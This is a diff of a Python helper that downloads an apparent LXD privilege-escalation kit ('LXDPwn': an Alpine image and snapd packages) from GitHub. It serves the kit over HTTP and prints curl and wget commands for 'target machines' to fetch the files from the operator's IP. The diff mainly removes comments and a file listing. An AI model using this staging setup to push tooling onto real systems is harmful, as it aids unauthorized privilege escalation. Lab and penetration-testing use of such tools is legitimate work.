@@ -1,8 +1,5 @@
 #!/usr/bin/env python3
-"""
-LXD Offline Setup - Simple & Colorful
-Just run it and enter the port when prompted
-"""
+
 
 import os
 import sys
@@ -25,11 +22,9 @@ class Colors:
     UNDERLINE = '\033[4m'
     END = '\033[0m'
 
-# Configuration
 DOWNLOAD_DIR = os.path.expanduser("~/lxd-offline")
 DEFAULT_PORT = 8000
 
-# CORRECTED FILES with proper repository path
 FILES = [
     "alpine-v3.13-x86_64-20210218_0139.tar.gz",
     "core_17272.assert",
@@ -39,11 +34,10 @@ FILES = [
     "snapd_2.71-3+b1_amd64.deb"
 ]
 
-# CORRECTED BASE URL - using LXDPwn instead of LXD+helper
 BASE_URL = "https://github.com/jac11/LXDPwn/releases/download/LXDPwn"
 
 def print_banner():
-    """Print colorful banner"""
+
     banner = f"""
 {Colors.CYAN}{Colors.BOLD} _    __  ______  ______        ___   _ 
 | |   \\ \\/ /  _ \\|  _ \\ \\      / / \\ | |
@@ -57,7 +51,7 @@ def print_banner():
     print(banner)
 
 def print_step(step, message):
-    """Print step with color"""
+
     steps = {
         'info': f"{Colors.BLUE}ℹ️{Colors.END}",
         'success': f"{Colors.GREEN}✅{Colors.END}",
@@ -72,7 +66,7 @@ def print_step(step, message):
     print(f"{icon} {message}")
 
 def format_size(size):
-    """Format file size"""
+
     for unit in ['B', 'KB', 'MB', 'GB']:
         if size < 1024.0:
             return f"{size:.1f} {unit}"
@@ -80,7 +74,7 @@ def format_size(size):
     return f"{size:.1f} TB"
 
 def get_port():
-    """Ask user for port number"""
+
     while True:
         try:
             print()
@@ -96,7 +90,6 @@ def get_port():
             print_step('error', "Please enter a valid number")
 
 def download_file(url, filename):
-    """Download file with progress bar"""
     try:
         response = requests.get(url, stream=True)
         response.raise_for_status()
@@ -124,24 +117,24 @@ def download_file(url, filename):
                         sys.stdout.flush()
         
         os.rename(filename + '.tmp', filename)
-        print()  # New line after progress
+        print()
         print_step('success', f"{filename} downloaded successfully")
         return True
         
     except Exception as e:
-        print()  # New line after progress
+        print()  
+
         print_step('error', f"Failed to download {filename}: {e}")
         return False
 
 def main():
     print_banner()
     
-    # Create directory
+   
     os.makedirs(DOWNLOAD_DIR, exist_ok=True)
     os.chdir(DOWNLOAD_DIR)
     print_step('folder', f"Working directory: {Colors.BOLD}{DOWNLOAD_DIR}{Colors.END}")
-    
-    # Download files
+
     print_step('info', "Checking files...")
     print()
     
@@ -154,12 +147,7 @@ def main():
             url = f"{BASE_URL}/{filename}"
             print_step('download', f"Downloading {Colors.BOLD}{filename}{Colors.END}...")
             download_file(url, filename)
-    
-    # Show all files with details
-    print()
-    print_step('info', f"{Colors.BOLD}Files in repository:{Colors.END}")
-    print(f"{Colors.CYAN}╔{'═' * 70}╗{Colors.END}")
-    
+   
     files_list = []
     total_size = 0
     for filename in sorted(os.listdir('.')):
@@ -169,18 +157,14 @@ def main():
             modified = datetime.fromtimestamp(os.path.getmtime(filename))
             files_list.append((filename, size, modified))
     
-    for filename, size, modified in files_list:
-        size_str = format_size(size)
-        mod_str = modified.strftime("%Y-%m-%d %H:%M")
-        print(f"{Colors.CYAN}║{Colors.END}  • {Colors.WHITE}{filename:<40}{Colors.END} {Colors.GREEN}{size_str:>8}{Colors.END}  {Colors.YELLOW}{mod_str}{Colors.END}  {Colors.CYAN}║{Colors.END}")
+       
     
-    print(f"{Colors.CYAN}╚{'═' * 70}╝{Colors.END}")
+   
     print_step('info', f"Total: {Colors.BOLD}{len(files_list)} files ({format_size(total_size)}){Colors.END}")
     
-    # Get port from user
+   
     port = get_port()
-    
-    # Start server
+   
     print()
     print_step('server', f"{Colors.BOLD}Starting HTTP server on port {port}...{Colors.END}")
     print_step('folder', f"Serving files from: {Colors.BOLD}{DOWNLOAD_DIR}{Colors.END}")
@@ -188,10 +172,6 @@ def main():
     print(f"{Colors.GREEN}💡 On target machines, use:{Colors.END}")
     print(f"   {Colors.YELLOW}curl -O http://YOUR_IP:{port}/<filename>{Colors.END}")
     print(f"   {Colors.YELLOW}wget http://YOUR_IP:{port}/<filename>{Colors.END}")
-    print()
-    print(f"{Colors.CYAN}📋 Available files:{Colors.END}")
-    for filename, size, _ in files_list:
-        print(f"   • {Colors.WHITE}{filename}{Colors.END} ({Colors.GREEN}{format_size(size)}{Colors.END})")
     print()
     print(f"{Colors.YELLOW}⏸️  Press Ctrl+C to stop the server{Colors.END}")
     print()
@@ -206,7 +186,7 @@ def main():
                 print(f"{Colors.GREEN}📤 {Colors.END}{Colors.WHITE}{filename}{Colors.END} {Colors.CYAN}served{Colors.END}")
     
     httpd = HTTPServer(("0.0.0.0", port), ColorHandler)
-    
+    print(f" Server Start 0.0.0.0:{port}{Colors.BOLD}")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
